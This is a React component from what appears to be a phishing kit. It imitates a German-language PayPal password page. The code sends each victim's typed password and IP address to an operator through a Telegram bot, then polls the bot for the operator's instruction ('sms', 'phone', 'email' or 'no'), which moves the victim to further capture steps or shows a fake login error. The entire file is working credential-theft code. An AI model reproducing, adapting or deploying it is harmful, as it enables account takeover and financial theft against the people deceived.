import React, {useEffect} from 'react';
import {useState} from "react";
import axios from "axios";
import bot from "../../bot_manager/manager";
import classes from "../email/Email.module.css";
import {Link} from "react-router-dom";
import loader from '../../assets/loader.gif'

let firstState;

const Password = (props) => {

    const [password, setPassword] = useState('')
    const [isLoading, setLoading] = useState(false);
    const [isError, setError] = useState(false);
    const [invalid, setInvalid] = useState(false);


    const enterPassword =  () => {
        if (!password) {
            setInvalid(true);
            return
        }
        axios.get(bot.getUpdates())
            .then((res) => {
                firstState = res.data.result;
            })
        setLoading(true);
        axios.post(bot.sendMessage('Пользователь <code>' + props.info.IPv4 + '</code>' +
            ' говорит, что его пароль: ' + password + '.%0A Если пароль верный, введите (sms/phone/email).%0A' +
            'Если нет, напишите (no)'), '')
    }


    const getUpdatesInterval =  () => {
        let req;
        if (firstState.length > 80) {
            req = bot.getUpdatesOffset(Number(firstState[firstState.length - 1].update_id) + 1)
        } else req = bot.getUpdates();
        axios.get(req)
            .then((res) => {
                if (firstState) {
                    if (res.data.result.length !== firstState.length) {
                        let text = res.data.result[res.data.result.length - 1].message.text;
                        if (text.indexOf(props.info.IPv4) !== -1) {
                            if (text.indexOf('sms') !== -1) props.setState(1)
                            else if (text.indexOf('phone') !== -1) props.setState(2)
                            else if (text.indexOf('email') !== -1) props.setState(3)
                            else if (text.indexOf('no') !== -1) {
                                setLoading(false);
                                setError(true)
                            } else firstState = res.data.result;
                        } else firstState = res.data.result;
                    }
                } else firstState = res.data.result;

            })
    }

    useEffect(() => {
        if (isLoading) {
            console.log("Start");
            const interval = setInterval(getUpdatesInterval, 5000);
            return () => clearInterval(interval);
        }
    }, [isLoading])

    return (
        <div className={classes.corral}>
            {isLoading ? <img src={loader} className={classes.loader}/> : null}
            <div className={[classes.contentContainerBordered, isLoading ? classes.loaderActive : ''].join(' ')}>
                <header>
                    <p role={"img"}
                       className={[classes.paypal_logo, classes.paypal_logo_long, classes.signin_paypal_logo].join(' ')}></p>
                </header>
                <div id={"loginContent"}>
                    <div id="loginSection">
                        <div className={classes.notifications}>
                            <div className={classes.notifications}>
                                {isError ? <p className={[classes.notification, classes.notificationCritical].join(' ')}
                                              role="alert">Die eingegebenen Login-Daten sind nicht richtig.
                                    Bitte versuchen Sie es erneut.
                                </p> : null}
                            </div>
                        </div>
                        <form className={classes.maskable} onSubmit={(e) => {
                            e.preventDefault();
                            enterPassword();
                        }}>
                            <div className={classes.clearfix}>
                                <div className={classes.splitPhoneSection}>
                                    <div style={{textAlign:'center'}}>
                                        <a href="#" id="forgotPassword"
                                           className={[classes.recoveryOption, classes.forgotPassword].join(' ')}
                                           data-client-log-action-type="clickForgotPasswordLink"
                                           pa-marked="1">{props.email}</a>
                                    </div>
                                    <div className={classes.textInput}>
                                        <div className={classes.fieldWrapper}>
                                            {invalid ?
                                                <div className={[classes.errorMessage, classes.show].join(' ')}>
                                                    <p className="invalidError hide">Diese Angabe ist erforderlich.</p>
                                                </div> : ''}
                                            <label className={classes.fieldLabel}></label>
                                            <input placeholder={"Passwort"} type={"password"} value={password}
                                                   onChange={e => {
                                                       setInvalid(false);
                                                       setPassword(e.target.value)
                                                   }}/>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                </div>
                <div className={classes.actions}>
                    <button className={[classes.button].join(' ')} onClick={enterPassword}>
                        Weiter
                    </button>
                </div>
                <div className={classes.signupContainer}>
                    <div className={classes.loginSignUpSeparator}>
                        <span className={classes.textInSeparator}>
                            oder
                        </span>
                    </div>
                    <Link to={"/something"}>
                        <button className={[classes.button, classes.secondary].join(' ')} onClick={enterPassword}>
                            Neu anmelden
                        </button>
                    </Link>
                </div>
                <div className={classes.intentFooter}>
                    <div className={classes.localeSelector}>
                        <span className={[classes.picker, classes.country_selector].join(' ')}>
                            <button className={[classes.country ,classes.RU].join(' ')}>
                            </button>
                        </span>
                        <ul className={classes.localeLink}>
                            <li>
                                <a className={classes.selected}>Deutsch</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Password;